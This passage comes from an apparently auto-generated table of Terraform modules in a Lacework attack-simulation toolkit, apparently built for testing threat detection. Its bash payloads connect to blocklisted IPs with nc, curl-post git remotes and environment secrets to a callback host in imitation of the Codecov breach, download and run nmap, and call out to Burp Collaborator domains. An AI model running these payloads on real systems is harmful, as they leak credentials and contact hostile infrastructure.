python3&#45;pip mysql&#45;shell&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    app = templatefile&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/app&#46;py&#46;tpl&quot;,<br/>                            &&#35;123;<br/>                                region = var&#46;inputs&&#35;91;&quot;db&&#35;95;region&quot;&&#35;93;<br/>                            &&#35;125;<br/>                        &&#35;41;<br/>    test = templatefile&&#35;40;<br/>                          &quot;$&&#35;123;path&#46;module&&#35;125;/resources/test&#46;py&#46;tpl&quot;,<br/>                            &&#35;123;<br/>                                region = var&#46;inputs&&#35;91;&quot;db&&#35;95;region&quot;&&#35;93;<br/>                            &&#35;125;<br/>                        &&#35;41;<br/>    requirements = templatefile&&#35;40;<br/>                          &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;,<br/>                          &&#35;123;&&#35;125;<br/>                        &&#35;41;<br/>    database = templatefile&&#35;40;<br/>                          &quot;$&&#35;123;path&#46;module&&#35;125;/resources/bootstrap&#46;sql&#46;tpl&quot;,<br/>                            &&#35;123;<br/>                                db&&#35;95;user = var&#46;inputs&&#35;91;&quot;db&&#35;95;user&quot;&&#35;93;<br/>                                db&&#35;95;name = var&#46;inputs&&#35;91;&quot;db&&#35;95;name&quot;&&#35;93;<br/>                            &&#35;125;<br/>                        &&#35;41;<br/>    entrypoint = templatefile&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/entrypoint&#46;sh&#46;tpl&quot;,<br/>                            &&#35;123;<br/>                                 listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                                 app&&#35;95;path = local&#46;app&&#35;95;path<br/>                            &&#35;125;<br/>                        &&#35;41;<br/>    index = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/index&#46;html&quot;<br/>                        &&#35;41;<br/>    cast = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/cast&#46;html&quot;<br/>                        &&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| target-ssm-connect-badip                                                   | ./modules/ssm/connect-badip                                    | ssm_connect_bad_ip                         | context.aws.ssm.target.connect.badip                                      | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "connect": {<br/>                        "badip": {<br/>                            "enabled": false,<br/>                            "iplist_url": "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset",<br/>                            "retry_delay_secs": 1800<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-badip                                    | <pre>locals &&#35;123;<br/>    iplist&&#35;95;url = var&#46;inputs&&#35;91;&quot;iplist&&#35;95;url&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;iplist&&#35;95;base64&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; threatdb&#46;csv<br/>        log &quot;enumerating bad ips in threatdb&#46;csv&quot;<br/>        for i in $&&#35;40;grep &&#35;x27;IPV4,&&#35;x27; threatdb&#46;csv &#124; awk &#45;F&&#35;x27;,&&#35;x27; &&#35;x27;&&#35;123; print $2 &&#35;125;&&#35;x27; &&#35;41;; do log &quot;connecting to: $i&quot;; nc &#45;vv &#45;w 5 $i 80 &gt;&gt; $LOGFILE 2&gt;&amp;1; sleep 1; done;<br/>        log &&#35;x27;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;retry&&#35;95;delay&&#35;95;secs&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&&#35;x27;;<br/>        sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;retry&&#35;95;delay&&#35;95;secs&quot;&&#35;93;&&#35;125;<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    iplist&&#35;95;base64 = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/threatdb&#46;csv&quot;&&#35;41;<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| target-ssm-connect-codecov                                                 | ./modules/ssm/connect-codecov                                  | ssm_connect_codecov                        | context.aws.ssm.target.connect.codecov                                    | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "connect": {<br/>                        "codecov": {<br/>                            "enabled": false,<br/>                            "env_secrets": [<br/>                                "SECRET=supersecret123"<br/>                            ],<br/>                            "git_origin": "git@git.localhost:repo/repo.git",<br/>                            "host_ip": null,<br/>                            "host_port": 8080,<br/>                            "use_ssl": false<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-codecov                                  | <pre>locals &&#35;123;<br/>    host&&#35;95;ip = var&#46;inputs&&#35;91;&quot;host&&#35;95;ip&quot;&&#35;93;<br/>    host&&#35;95;port = var&#46;inputs&&#35;91;&quot;host&&#35;95;port&quot;&&#35;93;<br/>    git&&#35;95;origin=var&#46;inputs&&#35;91;&quot;git&&#35;95;origin&quot;&&#35;93;<br/>    env&&#35;95;secrets=join&&#35;40;&quot; &quot;, var&#46;inputs&&#35;91;&quot;env&&#35;95;secrets&quot;&&#35;93;&&#35;41;<br/>    callback&&#35;95;url = var&#46;inputs&&#35;91;&quot;use&&#35;95;ssl&quot;&&#35;93; == true ? &quot;https://$&&#35;123;local&#46;host&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;host&&#35;95;port&&#35;125;&quot; : &quot;http://$&&#35;123;local&#46;host&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;host&&#35;95;port&&#35;125;&quot;<br/>    command&&#35;95;payload=&lt;&lt;&#45;EOT<br/>    LOGFILE=/tmp/$&&#35;123;basename&&#35;40;path&#46;module&&#35;41;&&#35;125;&&#35;95;command&#46;log<br/>    function log &&#35;123;<br/>        echo &&#35;96;date &#45;u &#43;&quot;%Y&#45;%m&#45;%dT%H:%M:%SZ&quot;&&#35;96;&quot; $1&quot;<br/>        echo &&#35;96;date &#45;u &#43;&quot;%Y&#45;%m&#45;%dT%H:%M:%SZ&quot;&&#35;96;&quot; $1&quot; &gt;&gt; $LOGFILE<br/>    &&#35;125;<br/>    rm &#45;rf /tmp/repo<br/>    mkdir &#45;p /tmp/repo<br/>    cd /tmp/repo<br/>    git init<br/>    git remote add origin $&&#35;123;local&#46;git&&#35;95;origin&&#35;125;<br/>    log &quot;running curl post: curl &#45;sm 0&#46;5 &#45;d &&#35;92;&quot;$&&#35;40;git remote &#45;v&&#35;41;&lt;&lt;&lt;&lt;&lt;&lt; ENV $&&#35;40;env&&#35;41;&&#35;92;&quot; $&&#35;123;local&#46;callback&&#35;95;url&&#35;125;/upload/v2&quot;<br/>    curl &#45;sm 0&#46;5 &#45;d &quot;$&&#35;40;git remote &#45;v&&#35;41;&lt;&lt;&lt;&lt;&lt;&lt; ENV $&&#35;40;env&&#35;41;&quot; $&&#35;123;local&#46;callback&&#35;95;url&&#35;125;/upload/v2 &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    sleep 30<br/>    exit<br/>    EOT<br/>    base64&&#35;95;command&&#35;95;payload=local&#46;command&&#35;95;payload<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        screen &#45;S codecov &#45;X quit<br/>        screen &#45;wipe<br/>        truncate &#45;s 0 /tmp/codecov&#46;log<br/>        log &quot;checking for git&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v git; do<br/>            log &quot;git not found &#45; waiting&quot;<br/>            sleep 10<br/>        done<br/>        log &quot;git: $&&#35;40;command &#45;v  git&&#35;41;&quot;<br/>        screen &#45;d &#45;Logfile /tmp/codecov&#46;log &#45;S codecov &#45;m env &#45;i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $&&#35;123;local&#46;env&&#35;95;secrets&&#35;125; /bin/bash &#45;&#45;noprofile &#45;&#45;norc<br/>        screen &#45;S codecov &#45;X colon &quot;logfile flush 0^M&quot;<br/>        log &&#35;x27;sending screen command: $&&#35;123;local&#46;command&&#35;95;payload&&#35;125;&&#35;x27;;<br/>        screen &#45;S codecov &#45;p 0 &#45;X stuff &quot;echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;base64&&#35;95;command&&#35;95;payload&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &#124; /bin/bash &#45;^M&quot;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;git&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;git&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| target-ssm-connect-nmap-port-scan                                          | ./modules/ssm/connect-nmap-port-scan                           | ssm_connect_enumerate_host                 | context.aws.ssm.target.connect.nmap_port_scan                             | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "connect": {<br/>                        "nmap_port_scan": {<br/>                            "enabled": false,<br/>                            "nmap_scan_host": "portquiz.net",<br/>                            "nmap_scan_ports": [<br/>                                80,<br/>                                443,<br/>                                23,<br/>                                22,<br/>                                8080,<br/>                                3389,<br/>                                27017,<br/>                                3306,<br/>                                6379,<br/>                                5432,<br/>                                389,<br/>                                636,<br/>                                1389,<br/>                                1636<br/>                            ]<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-nmap-port-scan                           | <pre>locals &&#35;123;<br/>    nmap&&#35;95;download = &quot;https://github&#46;com/andrew&#45;d/static&#45;binaries/blob/master/binaries/linux/x86&&#35;95;64/nmap?raw=true&quot;<br/>    nmap&&#35;95;path = &quot;/tmp/nmap&quot;<br/>    nmap&&#35;95;ports = join&&#35;40;&quot;,&quot;,var&#46;inputs&&#35;91;&quot;nmap&&#35;95;scan&&#35;95;ports&quot;&&#35;93;&&#35;41;<br/>    nmap&&#35;95;scan&&#35;95;host = var&#46;inputs&&#35;91;&quot;nmap&&#35;95;scan&&#35;95;host&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;scan target: $&&#35;123;local&#46;nmap&&#35;95;scan&&#35;95;host&&#35;125; $&&#35;123;local&#46;nmap&&#35;95;ports&&#35;125;&quot;<br/>        log &quot;checking for nmap&quot;<br/>        if &#33; command &#45;v nmap; then<br/>            log &quot;nmap not found&quot;<br/>            log &quot;downloading: $&&#35;123;local&#46;nmap&&#35;95;download&&#35;125;&quot;<br/>            if &&#35;91; &#45;f $&&#35;123;local&#46;nmap&&#35;95;path&&#35;125; &&#35;93;; then<br/>                curl &#45;L &#45;o $&&#35;123;local&#46;nmap&&#35;95;path&&#35;125; $&&#35;123;local&#46;nmap&&#35;95;download&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>                chmod 755 $&&#35;123;local&#46;nmap&&#35;95;path&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>            fi<br/>            log &quot;using nmap: $&&#35;123;local&#46;nmap&&#35;95;path&&#35;125;&quot;<br/>            $&&#35;123;local&#46;nmap&&#35;95;path&&#35;125; &#45;sT &#45;p $&&#35;123;local&#46;nmap&&#35;95;ports&&#35;125; $&&#35;123;local&#46;nmap&&#35;95;scan&&#35;95;host&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        else<br/>            nmap &#45;sS &#45;p $&&#35;123;local&#46;nmap&&#35;95;ports&&#35;125; $&&#35;123;local&#46;nmap&&#35;95;scan&&#35;95;host&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        fi<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| target-ssm-connect-oast-host                                               | ./modules/ssm/connect-oast-host                                | ssm_connect_oast_host                      | context.aws.ssm.target.connect.oast                                       | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "connect": {<br/>                        "oast": {<br/>                            "enabled": false,<br/>                            "retry_delay_secs": 1800<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-oast-host                                | <pre>locals &&#35;123;<br/>    oast&&#35;95;domain = &quot;burpcollaborator&#46;net&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        OAST&&#35;95;URL=&quot;https://$&&#35;40;cat /dev/urandom &#124; tr &#45;dc &&#35;x27;&&#35;91;:lower:&&#35;93;&&#35;x27; &#124; fold &#45;w $$&&#35;123;1:&#45;16&&#35;125; &#124; head &#45;n 1&&#35;41;&#46;$&&#35;123;local&#46;oast&&#35;95;domain&&#35;125;&quot;<br/>        log &quot;http request: $OAST&&#35;95;URL&quot;<br/>        curl &#45;s &quot;$OAST&&#35;95;URL&quot; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &&#35;x27;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;retry&&#35;95;delay&&#35;95;secs&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&&#35;x27;;<br/>        sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;retry&&#35;95;delay&&#35;95;secs&quot;&&#35;93;&&#35;125;<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        